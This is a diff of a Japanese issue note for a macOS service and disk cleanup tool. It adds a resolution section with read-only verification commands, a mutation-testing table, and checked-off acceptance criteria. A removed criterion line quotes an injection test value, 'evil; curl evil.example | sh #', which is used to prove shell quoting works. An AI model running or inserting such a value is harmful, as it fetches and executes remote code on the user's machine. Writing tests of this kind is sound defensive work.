@@ -68,12 +68,51 @@ Container 名と `Item.Path` も攻撃者が置ける値なので同じ扱いが
 
 ## 受け入れ条件
 
-- [ ] 各 ID のコピー文に裏取りコマンドが入っている (プレースホルダが実値に置換されている)
-- [ ] 🚨 **すべてのプレースホルダが `svc.ShellQuote` を通っている**。細工した Path / Label /
-      Container 名がコマンド行を壊さないことを、`evil; curl evil.example | sh #` を含む値で固定する
-- [ ] `launchctl print` が `f.Domain` を使っている (`gui/$(id -u)/` の決め打ちでない)
-- [ ] `mdfind` を**出していない**こと (規律に反する。起票時の判断が誤りだった)
-- [ ] 変異検証: `ShellQuote` を外すとテストが red になる
+- [x] 各 ID のコピー文に裏取りコマンドが入っている (プレースホルダが実値に置換されている)
+- [x] 🚨 すべてのプレースホルダが `svc.ShellQuote` を通っている
+- [x] `launchctl print` が `f.Domain` を使っている
+- [x] `mdfind` を出していないこと
+- [x] 変異検証: `ShellQuote` を外すとテストが red になる
+
+## 対応 (2026-09-03)
+
+`diskVerifyCommands` と `svcVerifyCommands` を新設し、`diskCopyText` / `svcCopyText` から呼ぶ。
+**見出しを「この判定を自分で確かめるコマンド (読み取りのみ)」と
+「消すと決めたら手動で実行するコマンド」に分けた** — svc 側は既存の `f.Commands` が
+`launchctl bootout` / `rm` の破壊コマンドで、裏取りと混ぜると読み手が取り違える。
+
+実際の出力 (svc、`homebrew.mxcl.mysql@8.0` の例):
+
+```
+この判定を自分で確かめるコマンド (読み取りのみ):
+  plutil -p /L/homebrew.mxcl.mysql@8.0.plist
+  launchctl print gui/501/homebrew.mxcl.mysql@8.0
+  ls -l /opt/homebrew/opt/mysql/bin/mysqld
+  launchctl list | grep homebrew.mxcl.mysql@8.0
+  brew list --formula | grep mysql@8.0
+消すと決めたら手動で実行するコマンド (ツールは実行しない):
+  launchctl bootout gui/501/homebrew.mxcl.mysql@8.0
+```
+
+判定の種類で出す内容を変える: A なら `ls -l <MissingExec>` / B なら `launchctl list | grep` /
+C なら `brew list --formula | grep <formula>`。`plutil -p` と `launchctl print` は常に出す。
+
+disk 側は ID ごと。Items が多いエントリでコピー文が読めなくならないよう **上限 5 本** を置いた。
+
+### 変異検証 (使い捨て worktree、6 本とも red)
+
+| 変異 | 最初に落ちた assert |
+|---|---|
+| disk 側の `ShellQuote` を外す | パスを引用せずにコマンドへ埋めた |
+| svc 側の `ShellQuote` を外す | Label を引用せずにコマンドへ埋めた |
+| `gui/501/` の決め打ちに戻す | system ドメインなのに gui/ を決め打ちしている |
+| `mdfind` を復活させる | 否定された判定材料をコピー文に出した |
+| コマンド数の上限を外す | 裏取りコマンドが上限 5 を超えた (20 本) |
+| 読み取りコマンドを出すのをやめる (配線) | コピー文にコマンドが無い |
+
+⚠️ 1 本目は最初ビルド不能だった (`q` が未使用になる)。当て直して red を確認した。
+
+`make test` rc=0。
 
 ## この issue の反証レビュー (2026-09-03、opus)
 
